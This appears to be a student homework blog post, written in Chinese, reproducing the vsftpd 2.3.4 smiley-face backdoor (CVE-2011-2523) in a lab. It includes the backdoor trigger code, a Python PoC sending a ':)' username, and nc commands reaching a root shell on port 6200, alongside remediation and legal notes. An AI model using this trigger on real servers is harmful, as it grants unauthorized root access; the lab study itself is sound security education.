@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>【课后作业】vsftpd 2.3.4 笑脸漏洞——从源码后门到 PoC 验证 // doing</title>
+<meta name="description" content="复现 CVE-2011-2523：一个笑脸符号如何变成 root shell，并用自己写的 Python PoC 验证漏洞存在。">
+<meta name="author" content="doing">
+<meta name="theme-color" content="#04070f">
+<meta name="color-scheme" content="dark">
+<meta name="keywords" content="网络安全, 渗透测试, CTF, doing">
+<meta name="generator" content="Hexo">
+<link rel="canonical" href="https://doingweb666.github.io/2026/11/09/vsftpd-smiley/">
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【课后作业】vsftpd 2.3.4 笑脸漏洞——从源码后门到 PoC 验证 // doing">
+<meta property="og:description" content="复现 CVE-2011-2523：一个笑脸符号如何变成 root shell，并用自己写的 Python PoC 验证漏洞存在。">
+<meta property="og:url" content="https://doingweb666.github.io/2026/11/09/vsftpd-smiley/">
+<meta property="og:site_name" content="doing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【课后作业】vsftpd 2.3.4 笑脸漏洞——从源码后门到 PoC 验证 // doing">
+<meta name="twitter:description" content="复现 CVE-2011-2523：一个笑脸符号如何变成 root shell，并用自己写的 Python PoC 验证漏洞存在。">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script>document.documentElement.className += ' js';</script>
+
+</head>
+<body class="post-page">
+  <canvas id="matrix" class="matrix" aria-hidden="true"
+    data-enabled="true"
+    data-opacity="0.2"
+    data-font-size="16"
+    data-speed="1"></canvas>
+
+  <div class="crt" aria-hidden="true">
+    <div class="crt__scanlines"></div>
+    <div class="crt__vignette"></div>
+  </div>
+
+  <a class="skip-link" href="#main">跳到正文</a>
+
+  
+<header class="site-header" id="top">
+  <div class="shell header__inner">
+    <a class="brand" href="/" aria-label="doing 首页">
+      <span class="brand__prompt" aria-hidden="true">root@doing:~#</span>
+      <span class="brand__name">doing</span>
+      <span class="brand__caret" aria-hidden="true"></span>
+    </a>
+
+    <button class="nav-toggle" id="nav-toggle" type="button" aria-expanded="false" aria-controls="site-nav" aria-label="打开导航菜单">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" id="site-nav" aria-label="主导航">
+      
+        <a class="site-nav__link"
+           href="/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>home
+        </a>
+      
+        <a class="site-nav__link"
+           href="/archives/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>archives
+        </a>
+      
+        <a class="site-nav__link"
+           href="/tags/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>tags
+        </a>
+      
+    </nav>
+  </div>
+</header>
+
+
+  <main class="main" id="main">
+    
+<div class="progress" id="progress" aria-hidden="true"></div>
+
+<article class="post">
+  <header class="post__head">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="/">~</a>
+      <span class="crumbs__sep" aria-hidden="true">/</span>
+      <a href="/archives/">posts</a>
+      <span class="crumbs__sep" aria-hidden="true">/</span>
+      <span class="crumbs__here">vsftpd-smiley</span>
+    </nav>
+
+    <h1 class="post__title glitch" data-text="【课后作业】vsftpd 2.3.4 笑脸漏洞——从源码后门到 PoC 验证">【课后作业】vsftpd 2.3.4 笑脸漏洞——从源码后门到 PoC 验证</h1>
+
+    <div class="post__meta">
+      <span class="post__meta-item"><span class="post__meta-key">date</span> <time datetime="2026-11-09T12:00:00.000Z">2026-11-09</time></span>
+      <span class="meta-dot" aria-hidden="true">•</span>
+      <span class="post__meta-item"><span class="post__meta-key">read</span> 6 min</span>
+      
+      <span class="meta-dot" aria-hidden="true">•</span>
+      <span class="post__meta-item"><span class="post__meta-key">dir</span> <a href="/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">渗透实战</a></span>
+      
+      
+      <span class="post__meta-tags">
+        
+        <a class="tag" href="/tags/vsftpd/">#vsftpd</a>
+        
+        <a class="tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+        
+        <a class="tag" href="/tags/PoC/">#PoC</a>
+        
+        <a class="tag" href="/tags/Python/">#Python</a>
+        
+      </span>
+      
+    </div>
+  </header>
+
+  <div class="post__layout has-toc">
+    <div class="file">
+      <div class="file__bar">
+        <span class="file__name"><span class="file__path" aria-hidden="true">~/posts/</span>vsftpd-smiley.md</span>
+        <span class="file__mode" title="只读文件">READ-ONLY</span>
+      </div>
+      <div class="file__body prose" id="post-content">
+        <p>vsftpd 2.3.4 在 2011 年被植入过后门，触发方式荒诞到像一个玩笑：<strong>FTP 用户名里带一个 <code>:)</code> 笑脸</strong>，服务端就会在 6200 端口 bind 一个 root 权限的 shell。这就是 CVE-2011-2523，俗称”笑脸漏洞”。</p>
+<p>它是理解”漏洞从哪来”的绝佳样本——不是配置错了，不是版本旧了，而是<strong>源码被人动过手脚</strong>。本文用一个自己写的 Python PoC 验证漏洞存在，点到为止，不深入利用。</p>
+<h2 id="⚙️-实验环境"><a href="#⚙️-实验环境" class="headerlink" title="⚙️ 实验环境"></a>⚙️ 实验环境</h2><ul>
+<li>攻击端：Kali Linux（<code>192.168.80.130</code>）</li>
+<li>靶机：Metasploitable2（<code>192.168.80.128</code>），两台都用 VMware 仅主机模式，同网段互通</li>
+<li>工具：nmap、nc、python3（只用标准库 socket）</li>
+</ul>
+<h2 id="🧬-后门是怎么写进去的"><a href="#🧬-后门是怎么写进去的" class="headerlink" title="🧬 后门是怎么写进去的"></a>🧬 后门是怎么写进去的</h2><p>官方源码的 <code>str.c</code> 里被混入了一段与 FTP 功能完全无关的函数 <code>vsf_sysutil_extra()</code>，它在用户名字段里匹配到 <code>0x3a 0x29</code>（也就是 ASCII 的 <code>:</code> 和 <code>)</code>）时执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((p_str-&gt;p_buf[i] == <span class="number">0x3a</span>) &amp;&amp; (p_str-&gt;p_buf[i+<span class="number">1</span>] == <span class="number">0x29</span>)) &#123;</span><br><span class="line">    vsf_sysutil_extra();   <span class="comment">/* bind 6200 -&gt; /bin/sh */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>vsf_sysutil_extra()</code> 做的事很直接：socket + bind 6200 + listen + accept，然后把连接接到 <code>/bin/sh</code> 上。因为 vsftpd 以 root 启动，这个 shell 也是 root。</p>
+<h2 id="🔍-第一步：确认版本"><a href="#🔍-第一步：确认版本" class="headerlink" title="🔍 第一步：确认版本"></a>🔍 第一步：确认版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 21,22,80 192.168.80.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2baf1b6ce1c93e17c05f42fade7eafff.png" alt="nmap 识别服务版本"></p>
+<p>21 端口返回 <code>vsftpd 2.3.4</code>，版本号一出来问题基本就定了——这个版本正是被投毒的那一版。顺带还看到 22 端口的 OpenSSH 4.7p1 和 80 端口的 Apache 2.2.8，都是 Metasploitable2 的典型指纹。</p>
+<h2 id="🐍-第二步：写一个只检测不利用的-PoC"><a href="#🐍-第二步：写一个只检测不利用的-PoC" class="headerlink" title="🐍 第二步：写一个只检测不利用的 PoC"></a>🐍 第二步：写一个只检测不利用的 PoC</h2><p>PoC 的判定逻辑分两级，缺一不可：</p>
+<ul>
+<li><strong>一级</strong>：21 端口 banner 是不是 <code>vsftpd 2.3.4</code></li>
+<li><strong>二级</strong>：用 <code>USER 用户名:)</code> 触发后门后，6200 端口是否变为可连接</li>
+</ul>
+<p>只做一级会误判（版本对但后门未必生效），只做二级会误报（别的服务也可能占着 6200）。核心代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TRIGGER_USER = <span class="string">b&quot;letmein:)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_backdoor</span>(<span class="params">host, port, timeout=<span class="number">5.0</span></span>):</span><br><span class="line">    s = socket.create_connection((host, port), timeout=timeout)</span><br><span class="line">    recv_line(s, timeout)                        <span class="comment"># 220 欢迎信息</span></span><br><span class="line">    s.sendall(<span class="string">b&quot;USER &quot;</span> + TRIGGER_USER + <span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    s.sendall(<span class="string">b&quot;PASS letmein\r\n&quot;</span>)               <span class="comment"># 密码随便填</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    recv_line(s, timeout)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<p>关键是 <code>USER letmein:)</code> 这一个包——服务端解析用户名时会命中那段后门代码，在 6200 上拉起 shell。</p>
+<p><img src="/images/f83c3420c6b8f0d160ef4af25e6bd6f4.png" alt="PoC 核心源码"></p>
+<h2 id="🧪-第三步：实测结果"><a href="#🧪-第三步：实测结果" class="headerlink" title="🧪 第三步：实测结果"></a>🧪 第三步：实测结果</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 vsftpd_smiley_poc.py 192.168.80.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/b99fd6d2ae83636bc6629d57602b6e37.png" alt="PoC 运行结果"></p>
+<p>输出依次是：banner <code>220 (vsFTPd 2.3.4)</code> → 发送恶意用户名 → 探测 6200 → <strong>端口开放，漏洞存在</strong>。</p>
+<p>再用 nc 手动确认一下这个 shell 是谁：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.80.128 6200</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">hostname</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/01cb502f582559986d9039fced682612.png" alt="nc 验证 root shell"></p>
+<p><code>uid=0(root) gid=0(root)</code>，主机名 <code>metasploitable</code>。到这一步已经足够证明漏洞存在，<strong>不再往下做任何操作</strong>——这是 PoC 和 EXP 的分界线。</p>
+<h2 id="🛠️-第四步：用-NSE-脚本交叉验证"><a href="#🛠️-第四步：用-NSE-脚本交叉验证" class="headerlink" title="🛠️ 第四步：用 NSE 脚本交叉验证"></a>🛠️ 第四步：用 NSE 脚本交叉验证</h2><p>Nmap 自带的脚本可以直接给出结论，不用自己拼包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 21 --script ftp-vsftpd-backdoor 192.168.80.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/35e356930f88dddaab93b345301479ee.png" alt="NSE 脚本检测结果"></p>
+<p>脚本返回 <code>VULNERABLE</code>，并给出 CVE-2011-2523 与 BID 48539。手工 PoC 和 NSE 两边结论一致，可信度就上来了。</p>
+<h2 id="🛡️-成因分析与修复"><a href="#🛡️-成因分析与修复" class="headerlink" title="🛡️ 成因分析与修复"></a>🛡️ 成因分析与修复</h2><table>
+<thead>
+<tr>
+<th>层面</th>
+<th>问题</th>
+<th>修复方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>供应链</td>
+<td>官方下载包被植入代码，签名无法校验</td>
+<td>校验哈希与 GPG 签名，从可信源获取</td>
+</tr>
+<tr>
+<td>进程权限</td>
+<td>vsftpd 以 root 启动</td>
+<td>用 <code>nobody</code> 低权限账户运行，需要端口绑定时用 capabilities</td>
+</tr>
+<tr>
+<td>网络</td>
+<td>6200 端口对外开放且无访问控制</td>
+<td>出站&#x2F;入站最小化，主机防火墙只放必要端口</td>
+</tr>
+<tr>
+<td>检测</td>
+<td>版本指纹直接暴露</td>
+<td>隐藏 banner 只能治标，升级才是治本</td>
+</tr>
+</tbody></table>
+<p>现实中的教训更值得记住：<strong>这个后门不是被”攻破”的，是被”发布”的</strong>。攻击者拿到的不是某台机器的权限，而是所有下载了这个版本的机器的权限。这也是软件供应链安全如今被反复强调的原因。</p>
+<h2 id="📌-补充说明"><a href="#📌-补充说明" class="headerlink" title="📌 补充说明"></a>📌 补充说明</h2><ul>
+<li><strong>后门是否一次性</strong>：实测漏洞可以反复触发，每次 <code>USER xx:)</code> 都会重新 bind 6200；真正一次性的只是那条已建立的 shell 会话，断开后进程即退出。</li>
+<li><strong>PoC 与 EXP 的边界</strong>：PoC 证明”存在”，EXP 证明”可利用”。课程作业要求的是前者，多走一步性质就变了。</li>
+<li><strong>合规边界</strong>：仅在自有或明确授权的靶场环境操作。对他人系统使用同一手法，构成《刑法》第 285 条规定的非法获取计算机信息系统数据、非法控制计算机信息系统罪。</li>
+</ul>
+
+      </div>
+    </div>
+
+    
+    <aside class="toc" aria-label="文章目录">
+      <p class="toc__title">// INDEX</p>
+      <nav class="toc__nav">
+        <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E2%9A%99%EF%B8%8F-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-list-text">⚙️ 实验环境</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%A7%AC-%E5%90%8E%E9%97%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%86%99%E8%BF%9B%E5%8E%BB%E7%9A%84"><span class="toc-list-text">🧬 后门是怎么写进去的</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%94%8D-%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%A1%AE%E8%AE%A4%E7%89%88%E6%9C%AC"><span class="toc-list-text">🔍 第一步：确认版本</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%90%8D-%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%86%99%E4%B8%80%E4%B8%AA%E5%8F%AA%E6%A3%80%E6%B5%8B%E4%B8%8D%E5%88%A9%E7%94%A8%E7%9A%84-PoC"><span class="toc-list-text">🐍 第二步：写一个只检测不利用的 PoC</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%A7%AA-%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%AE%9E%E6%B5%8B%E7%BB%93%E6%9E%9C"><span class="toc-list-text">🧪 第三步：实测结果</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%9B%A0%EF%B8%8F-%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%94%A8-NSE-%E8%84%9A%E6%9C%AC%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81"><span class="toc-list-text">🛠️ 第四步：用 NSE 脚本交叉验证</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-list-text">🛡️ 成因分析与修复</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%93%8C-%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"><span class="toc-list-text">📌 补充说明</span></a></li></ol>
+      </nav>
+    </aside>
+    
+  </div>
+
+  <footer class="post__foot">
+    
+    <div class="post__tags">
+      <span class="post__tags-label" aria-hidden="true">tags:</span>
+      
+      <a class="tag" href="/tags/vsftpd/">#vsftpd</a>
+      
+      <a class="tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+      
+      <a class="tag" href="/tags/PoC/">#PoC</a>
+      
+      <a class="tag" href="/tags/Python/">#Python</a>
+      
+    </div>
+    
+
+    
+    <nav class="post-nav" aria-label="上一篇 / 下一篇">
+      
+      <a class="post-nav__item post-nav__item--prev" href="/2026/10/31/curl/">
+        <span class="post-nav__label"><span aria-hidden="true">←</span> PREV</span>
+        <span class="post-nav__title">【课后作业】curl命令行</span>
+      </a>
+      
+      
+      <a class="post-nav__item post-nav__item--next" href="/2026/11/10/msfvenom-meterpreter/">
+        <span class="post-nav__label">NEXT <span aria-hidden="true">→</span></span>
+        <span class="post-nav__title">【课后作业】msfvenom 生成被控端与 Meterpreter 远程控制</span>
+      </a>
+      
+    </nav>
+    
+  </footer>
+</article>
+
+  </main>
+
+  
+<footer class="site-footer">
+  <div class="shell">
+    <div class="footer__grid">
+      <div class="footer__brand">
+        <p class="footer__prompt"><span class="ps1" aria-hidden="true">root@doing:~$</span> echo $SIGNATURE</p>
+        <p class="footer__signature">There is no place like 127.0.0.1.</p>
+      </div>
+
+      <div class="footer__col">
+        <p class="footer__label">// ELSEWHERE</p>
+        <a class="footer__link" href="/archives/">archives</a>
+        <a class="footer__link" href="/tags/">tags</a>
+        
+      </div>
+
+      <div class="footer__col">
+        <p class="footer__label">// SYSTEM</p>
+        <p class="footer__meta"><span>stack</span> hexo + ejs</p>
+        <p class="footer__meta"><span>uptime</span> since 2026</p>
+        <button class="matrix-toggle" id="matrix-toggle" type="button" aria-pressed="true">MATRIX: ON</button>
+      </div>
+    </div>
+
+    <div class="footer__bottom">
+      <span>© 2026 <span class="footer__name">doing</span> — all packets encrypted</span>
+      <span class="footer__eof" aria-hidden="true">[ EOF ]</span>
+      <a class="footer__top-link" href="#top">cd ~ <span aria-hidden="true">↑</span></a>
+    </div>
+  </div>
+</footer>
+
+
+  <button class="to-top" id="to-top" type="button" aria-label="返回顶部" title="回到顶部">↑</button>
+
+  
+<script src="/js/matrix.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
